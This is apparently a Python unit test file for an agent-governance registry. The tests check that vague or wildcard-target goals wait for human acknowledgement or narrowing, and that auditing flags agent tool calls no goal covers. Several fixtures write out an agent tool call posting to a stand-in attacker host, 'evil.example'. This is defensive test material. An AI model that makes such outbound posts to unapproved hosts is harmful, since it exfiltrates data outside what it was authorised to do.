"""Unit tests for wave-135 (row 11): vague-goal registration hardening.

Registration-time specificity enforcement: a goal whose declared
effects are empty, or that declares a wildcard ("*") target, is NOT
silently accepted as active -- it registers in ``pending_specificity``
status, covers nothing, and needs a human to narrow it or acknowledge
its breadth before it can cover actions.
"""

import os
import sys
import unittest

os.environ.setdefault("GOV_DEPLOYMENT_MODE", "staging")

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from gov import goals  # noqa: E402
from gov import goal_audit  # noqa: E402


class CheckSpecificityTest(unittest.TestCase):
    def test_specific_goal_not_vague(self):
        vague, reasons = goals.check_specificity(
            {"effects": [["write", "ledger"]]})
        self.assertFalse(vague)
        self.assertEqual(reasons, [])

    def test_empty_effects_vague(self):
        vague, reasons = goals.check_specificity({"effects": []})
        self.assertTrue(vague)
        self.assertTrue(any("no declared effects" in r for r in reasons))

    def test_wildcard_target_vague(self):
        vague, reasons = goals.check_specificity(
            {"effects": [["send", "*"]]})
        self.assertTrue(vague)
        self.assertTrue(any("*" in r for r in reasons))

    def test_one_vague_atom_taints_goal(self):
        vague, _ = goals.check_specificity(
            {"effects": [["write", "ledger"], ["delete", "*"]]})
        self.assertTrue(vague)

    def test_specific_looking_goal_passes(self):
        # "specific-looking but semantically broad" is the documented
        # paraphrase ceiling -- the check is structural, not semantic.
        vague, _ = goals.check_specificity(
            {"effects": [["send", "vendor.example.com"]]})
        self.assertFalse(vague)


class RegisterSpecificityTest(unittest.TestCase):
    def setUp(self):
        self.events = []
        self.reg = goals.GoalRegistry(audit=self.events.append)

    def test_vague_goal_registers_pending(self):
        g, _ = self.reg.register("a", "r1", "do whatever is needed",
                                 effects=[("send", "*")])
        self.assertEqual(g["status"], "pending_specificity")
        self.assertFalse(g["broad_scope_acknowledged"])
        self.assertTrue(g["specificity_reasons"])

    def test_pending_goal_not_active(self):
        g, _ = self.reg.register("a", "r1", "do whatever",
                                 effects=[("send", "*")])
        self.assertNotIn(g["goal_id"],
                         [x["goal_id"] for x in self.reg.active_goals()])

    def test_pending_event_is_loud(self):
        self.reg.register("a", "r1", "do whatever",
                          effects=[("send", "*")])
        pend = [e for e in self.events
                if e.get("event") == "goal_specificity_pending"]
        self.assertEqual(len(pend), 1)
        self.assertEqual(pend[0].get("flag"), "goal_specificity")
        self.assertTrue(pend[0].get("specificity_reasons"))

    def test_specific_goal_active_and_silent(self):
        g, _ = self.reg.register("a", "r1", "sync vendor",
                                 effects=[("send", "vendor.example.com")])
        self.assertEqual(g["status"], "active")
        self.assertFalse(g["broad_scope_acknowledged"])
        self.assertFalse(any(e.get("event") == "goal_specificity_pending"
                            for e in self.events))

    def test_empty_effects_goal_pending(self):
        g, _ = self.reg.register("a", "r1", "vague mandate", effects=[])
        self.assertEqual(g["status"], "pending_specificity")

    def test_chain_survives_pending_registration(self):
        self.reg.register("a", "r1", "do whatever", effects=[("send", "*")])
        self.reg.register("b", "r1", "specific",
                          effects=[("read", "ledger")])
        ok, reason = self.reg.verify_chain()
        self.assertTrue(ok, reason)

    def test_save_load_preserves_specificity(self):
        import tempfile
        g, _ = self.reg.register("a", "r1", "do whatever",
                                 effects=[("send", "*")])
        path = tempfile.mktemp(prefix="goalspec-")
        self.reg.save(path)
        reg2 = goals.GoalRegistry.load(path)
        g2 = reg2.get_goal(g["goal_id"])
        self.assertEqual(g2["status"], "pending_specificity")
        self.assertFalse(g2["broad_scope_acknowledged"])


class ResolveSpecificityTest(unittest.TestCase):
    def setUp(self):
        self.events = []
        self.reg = goals.GoalRegistry(audit=self.events.append)

    def _pending(self):
        g, _ = self.reg.register("a", "r1", "do whatever",
                                 effects=[("send", "*")])
        return g

    def test_allow_acknowledges_breadth(self):
        g = self._pending()
        summary = self.reg.resolve_specificity(
            g["goal_id"], acknowledged=True, approval_id="appr-1")
        rec = self.reg.get_goal(g["goal_id"])
        self.assertEqual(rec["status"], "active")
        self.assertTrue(rec["broad_scope_acknowledged"])
        self.assertEqual(summary["decision"], "acknowledged")
        resolved = [e for e in self.events
                    if e.get("event") == "goal_specificity_resolved"]
        self.assertEqual(len(resolved), 1)
        self.assertEqual(resolved[0].get("approval_id"), "appr-1")
        self.assertTrue(resolved[0].get("broad_scope_acknowledged"))

    def test_deny_withdraws_goal(self):
        g = self._pending()
        summary = self.reg.resolve_specificity(
            g["goal_id"], acknowledged=False, approval_id="appr-2")
        self.assertEqual(self.reg.get_goal(g["goal_id"])["status"],
                         "superseded")
        self.assertEqual(summary["decision"], "withdrawn")

    def test_unknown_goal_noop_loud(self):
        summary = self.reg.resolve_specificity(
            "goal-missing", acknowledged=True, approval_id="appr-3")
        self.assertEqual(len(summary["noop"]), 1)
        noops = [e for e in self.events
                 if e.get("event") == "goal_specificity_noop"]
        self.assertEqual(len(noops), 1)
        self.assertEqual(noops[0].get("flag"), "goal_specificity_noop")

    def test_already_active_noop_no_reapply(self):
        g, _ = self.reg.register("a", "r1", "specific",
                                 effects=[("read", "x")])
        n_before = len([e for e in self.events
                        if e.get("event") == "goal_status_changed"])
        summary = self.reg.resolve_specificity(
            g["goal_id"], acknowledged=True, approval_id="appr-4")
        n_after = len([e for e in self.events
                       if e.get("event") == "goal_status_changed"])
        self.assertEqual(n_before, n_after)
        self.assertEqual(len(summary["noop"]), 1)
        self.assertFalse(self.reg.get_goal(g["goal_id"])
                         ["broad_scope_acknowledged"])

    def test_chain_survives_ack(self):
        g = self._pending()
        self.reg.resolve_specificity(g["goal_id"], acknowledged=True,
                                     approval_id="appr-5")
        ok, reason = self.reg.verify_chain()
        self.assertTrue(ok, reason)

    def test_set_status_accepts_pending(self):
        g, _ = self.reg.register("a", "r1", "specific",
                                 effects=[("read", "x")])
        self.reg.set_status(g["goal_id"], "pending_specificity")
        self.assertEqual(self.reg.get_goal(g["goal_id"])["status"],
                         "pending_specificity")


class NarrowTest(unittest.TestCase):
    def setUp(self):
        self.events = []
        self.reg = goals.GoalRegistry(audit=self.events.append)

    def test_narrow_supersedes_and_reregisters(self):
        g, _ = self.reg.register("a", "r1", "do whatever",
                                 effects=[("send", "*")])
        new_g, conflicts = self.reg.narrow(
            g["goal_id"], effects=[("send", "vendor.example.com")])
        self.assertEqual(self.reg.get_goal(g["goal_id"])["status"],
                         "superseded")
        self.assertEqual(new_g["status"], "active")
        self.assertFalse(new_g["broad_scope_acknowledged"])
        self.assertEqual(conflicts, [])
        narrowed = [e for e in self.events
                    if e.get("event") == "goal_narrowed"]
        self.assertEqual(len(narrowed), 1)
        self.assertEqual(narrowed[0]["old_goal_id"], g["goal_id"])
        self.assertEqual(narrowed[0]["new_goal_id"], new_g["goal_id"])

    def test_narrow_still_vague_stays_pending(self):
        g, _ = self.reg.register("a", "r1", "do whatever",
                                 effects=[("send", "*")])
        new_g, _ = self.reg.narrow(g["goal_id"], effects=[])
        self.assertEqual(new_g["status"], "pending_specificity")

    def test_narrow_unknown_goal_raises(self):
        with self.assertRaises(ValueError):
            self.reg.narrow("goal-missing", effects=[("read", "x")])

    def test_narrow_active_goal_raises(self):
        g, _ = self.reg.register("a", "r1", "specific",
                                 effects=[("read", "x")])
        with self.assertRaises(ValueError):
            self.reg.narrow(g["goal_id"], effects=[("read", "y")])

    def test_narrow_malformed_atoms_refused(self):
        g, _ = self.reg.register("a", "r1", "do whatever",
                                 effects=[("send", "*")])
        with self.assertRaises(ValueError):
            self.reg.narrow(g["goal_id"],
                            effects=[("vaporize", "x")])

    def test_chain_survives_narrow(self):
        g, _ = self.reg.register("a", "r1", "do whatever",
                                 effects=[("send", "*")])
        self.reg.narrow(g["goal_id"],
                        effects=[("send", "vendor.example.com")])
        ok, reason = self.reg.verify_chain()
        self.assertTrue(ok, reason)


class AuditCoverageTest(unittest.TestCase):
    def _tool_call(self, agent, tool, args):
        return {"event": "tool_call", "run_id": "r1", "agent_id": agent,
                "tool": tool, "args": args, "decision": "allowed_executed"}

    def test_pending_goal_covers_nothing(self):
        events = []
        reg = goals.GoalRegistry(audit=events.append)
        g, _ = reg.register("agent-a", "r1", "do whatever",
                            effects=[("send", "*")])
        entries = events + [self._tool_call(
            "agent-a", "http_post",
            {"url": "https://evil.example/x"})]
        findings, _summary = goal_audit.audit_entries(
            "r1", entries, registry=reg)
        gaps = [f for f in findings
                if f["finding"] == "goal_coverage_gap"]
        self.assertEqual(len(gaps), 1)
        self.assertFalse(any(f["finding"] == "goal_wildcard_cover"
                             for f in findings))

    def test_acknowledged_wildcard_cover_is_loud(self):
        events = []
        reg = goals.GoalRegistry(audit=events.append)
        g, _ = reg.register("agent-a", "r1", "do whatever",
                            effects=[("send", "*")])
        reg.resolve_specificity(g["goal_id"], acknowledged=True,
                                approval_id="appr-1")
        entries = events + [self._tool_call(
            "agent-a", "http_post",
            {"url": "https://evil.example/x"})]
        findings, _summary = goal_audit.audit_entries(
            "r1", entries, registry=reg)
        wild = [f for f in findings
                if f["finding"] == "goal_wildcard_cover"]
        self.assertEqual(len(wild), 1)
        self.assertEqual(wild[0]["severity"], "high")
        self.assertEqual(wild[0].get("flag"),
                         "goal_wildcard_acknowledged")

    def test_unacknowledged_active_wildcard_stays_info(self):
        # A wildcard goal that is ACTIVE without the ack flag (e.g.
        # registered before this wave) keeps the old informational
        # severity -- only human-acknowledged breadth goes LOUD.
        events = []
        reg = goals.GoalRegistry(audit=events.append)
        g, _ = reg.register("agent-a", "r1", "legacy broad",
                            effects=[("send", "vendor.example.com")])
        # Simulate a pre-wave active wildcard: flip effects directly.
        g["effects"] = [["send", "*"]]
        entries = events + [self._tool_call(
            "agent-a", "http_post",
            {"url": "https://evil.example/x"})]
        findings, _summary = goal_audit.audit_entries(
            "r1", entries, registry=reg)
        wild = [f for f in findings
                if f["finding"] == "goal_wildcard_cover"]
        self.assertEqual(len(wild), 1)
        self.assertEqual(wild[0]["severity"], "info")

    def test_reconstructed_log_pending_covers_nothing(self):
        # Log-reconstruction path: pending status in goal_registered
        # events must not provide cover either.
        entries = [
            {"event": "goal_registered", "run_id": "r1",
             "agent_id": "agent-a", "goal_id": "g1",
             "effects": [["send", "*"]], "constraints": [],
             "status": "pending_specificity",
             "broad_scope_acknowledged": False},
            self._tool_call("agent-a", "http_post",
                            {"url": "https://evil.example/x"}),
        ]
        findings, _summary = goal_audit.audit_entries("r1", entries)
        self.assertTrue(any(f["finding"] == "goal_coverage_gap"
                            for f in findings))
        self.assertFalse(any(f["finding"] == "goal_wildcard_cover"
                             for f in findings))

    def test_reconstructed_log_acknowledged_wildcard_loud(self):
        entries = [
            {"event": "goal_registered", "run_id": "r1",
             "agent_id": "agent-a", "goal_id": "g1",
             "effects": [["send", "*"]], "constraints": [],
             "status": "pending_specificity",
             "broad_scope_acknowledged": False},
            {"event": "goal_specificity_resolved", "run_id": "r1",
             "agent_id": "agent-a", "goal_id": "g1",
             "decision": "acknowledged", "status": "active",
             "broad_scope_acknowledged": True},
            self._tool_call("agent-a", "http_post",
                            {"url": "https://evil.example/x"}),
        ]
        findings, _summary = goal_audit.audit_entries("r1", entries)
        wild = [f for f in findings
                if f["finding"] == "goal_wildcard_cover"]
        self.assertEqual(len(wild), 1)
        self.assertEqual(wild[0]["severity"], "high")


if __name__ == "__main__":
    unittest.main()
